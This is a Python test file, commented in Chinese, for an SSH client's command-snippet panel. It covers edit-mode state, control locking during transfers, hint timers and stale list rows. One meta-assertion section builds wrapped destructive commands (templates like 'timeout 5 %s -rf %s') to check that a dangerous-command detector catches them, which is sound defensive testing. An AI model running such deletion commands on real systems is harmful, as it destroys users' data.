    n = store.restore_builtins()
    check("编辑过的内置能被恢复成出厂原样（原来只按 id 判重，永远取不回）",
          store.get(first.id).command == first.command,
          store.get(first.id).command)
    check("恢复动作要报出条数（不然用户以为什么都没发生）", n > 0, n)
    pan.close()

    # 6) 关窗 / 隐藏都必须退出编辑态
    store, pan = new_panel()
    sn = store.add("生产 nginx", "systemctl restart nginx")
    pan.reload()
    pan.select(sn.id)
    pan.edit_btn.click()
    settle(app, 50)
    check("确实进了编辑态", pan.add_btn.text() == "保存")
    pan.close()
    settle(app, 50)
    pan.show()                      # main_window 复用同一个实例
    settle(app, 50)
    check("关窗再叫出**不再停在编辑态**（原来会静默覆盖）",
          pan.add_btn.text() == "添加", pan.add_btn.text())
    check("输入框已清空", pan.cmd_edit.text() == "")
    before = len(store.items)
    pan.title_edit.setText("我以为是新增")
    pan.cmd_edit.setText("df -h")
    pan.cmd_edit.returnPressed.emit()
    settle(app, 50)
    check("重开后回车是**新增**而不是覆盖原条",
          len(store.items) == before + 1
          and store.get(sn.id).command == "systemctl restart nginx",
          "条数 %d->%d" % (before, len(store.items)))
    pan.close()

    # 7) 编辑态下：出口留着，其余全禁
    store, pan = new_panel()
    pan.reload()
    pan.select(store.items[0].id)
    pan.edit_btn.click()
    settle(app, 50)
    for name in ("insert_btn", "delete_btn", "edit_btn", "restore_btn",
                 "filter_edit", "list"):
        check("编辑态下 %s 禁用" % name, not getattr(pan, name).isEnabled())
    check("编辑态下「保存」仍可用（唯一的出口不能一起堵死）",
          pan.add_btn.isEnabled())
    check("编辑态下「取消」仍可用", pan.cancel_btn.isEnabled())
    pan.close()

    # 7b) 传输期：restore_btn / filter_edit 之前漏禁
    from sshclient.ui.transfer_controller import TransferController
    store, pan = new_panel()
    ctrl = TransferController(None, None)
    pan._ctrl = ctrl
    ctrl.busyChanged.connect(pan.set_busy)
    pan.reload()
    pan.select(store.items[0].id)

    class _E:
        def start(self): pass

        def request_cancel(self): pass

    ctrl.begin("upload", "上传", _E(), 1)
    settle(app, 50)
    for name in ("insert_btn", "edit_btn", "delete_btn", "restore_btn",
                 "add_btn", "cancel_btn", "filter_edit", "list",
                 "title_edit", "cmd_edit"):
        check("传输期间 %s 禁用" % name, not getattr(pan, name).isEnabled(),
              "传输期间还能点")
    ctrl.succeed("")
    settle(app, 50)
    pan.close()

    # ------------------------------------------------------------ 8 制表符
    print("\n[31.8] 制表符：在远端会被 readline 当成补全请求")
    store, pan = new_panel()
    check("add() 拒收带 Tab 的命令", store.add("x", "ls\t-rf") is None)
    check("update() 也拒收", store.update(
        store.add("正常的", "df -h").id, "y", "ls\t-rf") is False)

    # ------------------------------------------------------------ 9 元断言
    print("\n[31.9] 元断言：装回缺陷版，这些判据必须全红")
    real = snippets._resolve_head

    def naive(words, raw_first=""):
        return words[0].strip().split("/")[-1], [], 0

    # 这一批**全部**是包装词/选项类：缺陷版连包装词都不剥，所以每一条都
    # 必须漏。少漏一条就说明上面某个判据量的是别的东西。
    #
    # **不放 `git -C … clean`**：那条是被 `_skip_global_opts` 抓的，而那个
    # 函数不在被替换的范围内 —— 它量的是「跳全局选项」那条独立规则。
    # 跟第 29 组的「绝对路径」是同一个道理：**元断言只能覆盖它自己替换掉
    # 的那部分**，硬凑只会把阈值逼松（评审实测阈值 5 时 7/12 失效照样绿）。
    must_blind = [cmd for _l, cmd in opt_cases] + [
        "timeout 5 %s -rf %s" % (R, T),
        "watch -n1 %s -rf %s" % (R, T),
    ]
    snippets._resolve_head = naive
    try:
        blind = [cmd for cmd in must_blind if not caught(cmd)]
        check("缺陷版（只看 words[0]）下这批必须**全部**漏掉，"
              "否则上面的判据量不到真行为", len(blind) == len(must_blind),
              "只有 %d/%d 条漏，仍被抓住的是：%s"
              % (len(blind), len(must_blind),
                 [c for c in must_blind if c not in blind]))
    finally:
        snippets._resolve_head = real
    check("装回真实现之后这批全部恢复",
          all(caught(c) for c in must_blind))
    check("默认内置集仍然干净（负向对照不是靠瞎报通过的）",
          audit_builtins() == [], str(audit_builtins()))


def group_32(app):
    """评审清单里剩下、但**不在那九条里**的两条界面缺陷。

    这两条都是"按钮已经禁对了，提示/列表却还在骗用户"那一类：
    协议上不出事，可用户看到的和实际状态对不上。
    """
    print("\n[32] 传输提示不被 4 秒定时器洗掉；条目被删后不留残行")
    from sshclient.ui.snippet_panel import SnippetPanel

    # ---------------------------------------------------- 传输中的提示
    reason = {"v": ""}
    store = SnippetStore(tmpdir() / "snippets.json")
    pan = SnippetPanel(store, lambda b: True, block_reason=lambda: reason["v"])
    check("确实造出了面板与提示条（防这一组空转）",
          pan is not None and hasattr(pan, "hint")
          and hasattr(pan, "_restore_hint"))

    pan._flash("已添加「df -h」")
    check("闪的那条提示确实上屏了（说明 4 秒定时器已经排上）",
          pan.hint.text() == "已添加「df -h」", pan.hint.text())

    reason["v"] = "传输进行中：通道被占着，插进去会被当成传输数据"
    pan.set_busy(True)
    settle(app, 30)
    check("闸门锁上之后提示换成了禁用原因",
          "传输进行中" in pan.hint.text(), pan.hint.text())

    # **真等那 4 秒**，不直接调槽。要钉的是"定时器到点那一刻用户看到什么"，
    # 不是"我手调那个方法会怎样" —— 后者量的是我自己的调用，不是产品行为。
    settle(app, 4300)
    check("4 秒定时器到点后**仍然**是禁用原因，没被默认文案洗掉",
          "传输进行中" in pan.hint.text(), pan.hint.text())

    reason["v"] = ""
    pan.set_busy(False)
    pan._restore_hint()
    check("闸门解锁后定时器该干的活还是要干（没变成永不还原）",
          "插入到远端当前的输入行" in pan.hint.text(), pan.hint.text())

    # ---- 负向对照：装回缺陷版（无条件覆盖）
    def _defective_restore_hint(self):
        self.hint.setText("插入到远端当前的输入行，不会自动回车；"
                          "想换命令先按 Ctrl+U 清行。")

    real_restore = type(pan)._restore_hint
    try:
        type(pan)._restore_hint = _defective_restore_hint
        reason["v"] = "传输进行中：通道被占着，插进去会被当成传输数据"
        pan.set_busy(True)
        pan._restore_hint()
        check("元断言：装回缺陷版后这条提示**确实**被洗成默认文案",
              "插入到远端当前的输入行" in pan.hint.text(), pan.hint.text())
    finally:
        type(pan)._restore_hint = real_restore
    pan.set_busy(True)
    pan._restore_hint()
    check("装回真实现之后禁用原因又守住了",
          "传输进行中" in pan.hint.text(), pan.hint.text())
    reason["v"] = ""
    pan.set_busy(False)

    # ---------------------------------------------------- 残行
    def _ids(p):
        return [p.list.item(i).data(QtCore.Qt.ItemDataRole.UserRole)
                for i in range(p.list.count())]

    store2 = SnippetStore(tmpdir() / "gones.json")
    pan2 = SnippetPanel(store2, lambda b: True)
    # **条数一律用相对量，别写死。** 内置集出厂就在里面（这是设计，不是
    # 缺陷），写死成 2 就是在测「出厂清单有几条」而不是在测残行。
    n0 = len(store2.items)
    a = store2.add("磁盘用量", "df -h")
    store2.add("内存占用", "free -m")
    check("确实多造出了两条可编辑的",
          a is not None and len(store2.items) == n0 + 2,
          "%d -> %d" % (n0, len(store2.items)))
    pan2.reload()
    check("能选中要编辑的那条", pan2.select(a.id))

    pan2.edit_btn.click()
    settle(app, 30)
    check("确实进编辑态了（量的是生产自己设的那个状态）",
          pan2._editing_id == a.id, repr(pan2._editing_id))
    check("编辑态下列表是锁着的", not pan2.list.isEnabled())

    # **用面板自己那个 store 删，不另开一个实例。** 真实产品里片段库整个
    # 进程一份（app_snippet_store()），另一个窗口删掉的就是这个对象上的东西。
    # 另开一个 SnippetStore 只会改到另一份内存副本，压根走不进
    # `_store.get(target) is None` 这条分支 —— 那样测的是一个到不了的分支。
    store2.remove(a.id)
    check("确认这条确实从 store 里没了（下面才有意义）",
          store2.get(a.id) is None)
    n_left = len(store2.items)

    pan2.title_edit.setText("我以为是新增")
    pan2.cmd_edit.setText("brand-new-cmd")
    pan2.add_btn.click()          # 生产入口：编辑态下它就是「保存」
    settle(app, 30)

    check("提示如实说「已经不在了」",
          "已经不在了" in pan2.hint.text(), pan2.hint.text())
    check("列表里不再有那一行（残行没了）",
          a.id not in _ids(pan2), str(_ids(pan2)))
    check("别的条目一条不少（不是把列表清空了）",
          len(_ids(pan2)) == n_left,
          "%d 行（预期 %d）" % (len(_ids(pan2)), n_left))
    check("没有新增出任何一条（条数没变）", len(store2.items) == n_left,
          "%d -> %d" % (n_left, len(store2.items)))

    # ---- 负向对照：不 reload 的话残行确实留着
    b = store2.add("网络状态", "ip a")
    pan2.reload()
    pan2.select(b.id)
    pan2.edit_btn.click()
    settle(app, 30)
    store2.remove(b.id)
    real_reload = type(pan2).reload
    try:
        type(pan2).reload = lambda self: None
        pan2.title_edit.setText("新标题")
        pan2.cmd_edit.setText("新命令")
        pan2.add_btn.click()
        settle(app, 30)
        check("元断言：不 reload 的话残行确实还躺在列表里",
              b.id in _ids(pan2), str(_ids(pan2)))
    finally:
        type(pan2).reload = real_reload
    pan2.reload()
    check("装回真实现之后残行又没了", b.id not in _ids(pan2), str(_ids(pan2)))
    check("「保存」按钮不再是编辑态了（编辑态确实退干净了）",
          pan2.add_btn.text() == "添加" and pan2.list.isEnabled(),
          "%s / list=%s" % (pan2.add_btn.text(), pan2.list.isEnabled()))

    pan.close()
    pan2.close()


class _NullEngine:
    def start(self): pass

    def request_cancel(self): pass


def _settings_for(n):
    from sshclient.core import settings as S
    st = S.AppSettings()
    st.save = lambda: None
    return st


def _store_for(n):
    from sshclient.core import settings as S
    return S.SessionStore(pathlib.Path(tempfile.mkdtemp()) / "s.json")


def lrzsz_resolve():
    from sshclient.core import lrzsz
    return lrzsz.resolve_binary


def _set_lrzsz_resolve(fn):
    from sshclient.core import lrzsz
    lrzsz.resolve_binary = fn


if __name__ == "__main__":
    sys.exit(main())
